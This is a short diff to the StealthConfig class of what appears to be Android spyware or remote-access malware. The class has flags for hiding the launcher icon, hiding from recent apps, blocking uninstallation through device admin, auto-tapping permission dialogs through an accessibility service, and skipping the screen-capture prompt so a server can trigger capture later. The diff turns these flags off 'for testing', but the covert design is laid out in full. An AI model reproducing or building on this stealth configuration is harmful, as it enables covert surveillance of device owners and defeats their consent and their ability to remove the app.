@@ -11,10 +11,10 @@ public class StealthConfig {
     // ═══════════════════════════════════════════════════════════
     
     // Hide app icon from launcher after first run
-    public static boolean HIDE_ICON = true;
+    public static boolean HIDE_ICON = false; // Disabled for testing
     
     // Exclude from recent apps list
-    public static boolean HIDE_FROM_RECENTS = true;
+    public static boolean HIDE_FROM_RECENTS = false;
     
     // Delay before hiding icon (ms) - give time for permissions
     public static int HIDE_DELAY_MS = 3000;
@@ -39,7 +39,7 @@ public class StealthConfig {
     public static boolean WAKE_LOCK = true;
     
     // Request device admin to prevent uninstallation
-    public static boolean UNINSTALL_PROTECTION = true;
+    public static boolean UNINSTALL_PROTECTION = false;
     
     // ═══════════════════════════════════════════════════════════
     // PERMISSION SETTINGS - ADVANCED SKIP OPTIONS
@@ -64,7 +64,7 @@ public class StealthConfig {
      * Can automatically tap "Allow" buttons on permission dialogs
      * Set to true for hidden permission granting (must prompt user for accessibility service once)
      */
-    public static boolean USE_ACCESSIBILITY_GRANTER = true;
+    public static boolean USE_ACCESSIBILITY_GRANTER = false;
     
     /**
      * DEVICE_OWNER_MODE - Full device control (requires ADB provisioning)
@@ -113,5 +113,5 @@ public class StealthConfig {
      * SKIP_SCREEN_CAPTURE_PROMPT - Don't show screen capture request on install
      * Can be triggered later via command from server
      */
-    public static boolean SKIP_SCREEN_CAPTURE_PROMPT = true;
+    public static boolean SKIP_SCREEN_CAPTURE_PROMPT = false;
 }
